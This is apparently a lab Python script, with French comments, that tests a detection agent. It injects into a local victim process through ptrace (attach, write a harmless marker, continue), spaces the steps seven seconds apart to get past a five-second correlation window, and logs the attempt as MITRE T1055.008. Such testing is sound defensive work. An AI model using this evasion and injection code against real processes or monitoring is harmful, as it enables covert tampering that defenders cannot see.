#!/usr/bin/env python3
"""
EVASION 1 - Contournement par etalement temporel
(Version mise a jour Semaine 6 : journalisation cote attaquant ajoutee)
Usage: sudo python3 evasion1_timing.py <PID_victime> <adresse_hex>
"""

import ctypes
import ctypes.util
import sys
import time
import os
from attacker_log import log_attempt

if len(sys.argv) != 3:
    print(f"Usage: sudo python3 {sys.argv[0]} <PID_victime> <adresse_hex>")
    sys.exit(1)

victim_pid = int(sys.argv[1])
target_addr = int(sys.argv[2], 16)

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
libc.ptrace.restype = ctypes.c_long
libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]

PTRACE_ATTACH, PTRACE_POKEDATA, PTRACE_CONT, PTRACE_DETACH = 16, 5, 7, 17
DELAI_EVASION_SEC = 7

def ptrace_call(request, pid, addr, data):
    ctypes.set_errno(0)
    result = libc.ptrace(request, pid, addr, data)
    if result == -1 and ctypes.get_errno() != 0:
        raise OSError(ctypes.get_errno(), f"ptrace({request}) a echoue")
    return result

def wait_until_stopped(pid, timeout=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with open(f"/proc/{pid}/status") as f:
                for line in f:
                    if line.startswith("State:") and ("t (tracing stop)" in line or "T (stopped)" in line):
                        return True
        except FileNotFoundError:
            return False
        time.sleep(0.05)
    return False

start_time = time.time()
print(f"[EVASION-1] Attaquant PID {os.getpid()} -> Victime PID {victim_pid}")
print(f"[EVASION-1] Strategie : etaler l'attaque sur {DELAI_EVASION_SEC}s (> fenetre de correlation de 5s)\n")

print("[EVASION-1] Etape 1/3 : PTRACE_ATTACH ...")
ptrace_call(PTRACE_ATTACH, victim_pid, None, None)
wait_until_stopped(victim_pid)
print(f"[EVASION-1] Attache. Pause de {DELAI_EVASION_SEC}s avant l'ecriture ...")
time.sleep(DELAI_EVASION_SEC)

print("[EVASION-1] Etape 2/3 : PTRACE_POKEDATA (ecriture inoffensive) ...")
ptrace_call(PTRACE_POKEDATA, victim_pid, target_addr, 0x4242424242424242)
print(f"[EVASION-1] Ecrit. Pause de {DELAI_EVASION_SEC}s avant la reprise ...")
time.sleep(DELAI_EVASION_SEC)

print("[EVASION-1] Etape 3/3 : PTRACE_CONT + DETACH ...")
ptrace_call(PTRACE_CONT, victim_pid, None, None)
try:
    ptrace_call(PTRACE_DETACH, victim_pid, None, None)
except OSError:
    pass

total_delta = time.time() - start_time

print("\n[EVASION-1] Termine. Verifie le terminal de l'agent.")

# --- NOUVEAU : journalisation cote attaquant ---
log_attempt(
    technique="Injection ptrace - evasion par etalement temporel",
    mitre_id="T1055.008",
    target_pid=victim_pid,
    target_process="victim.py",
    success=True,
    details=f"Attaque etalee sur {total_delta:.2f}s au total (delais de {DELAI_EVASION_SEC}s entre chaque etape)",
)
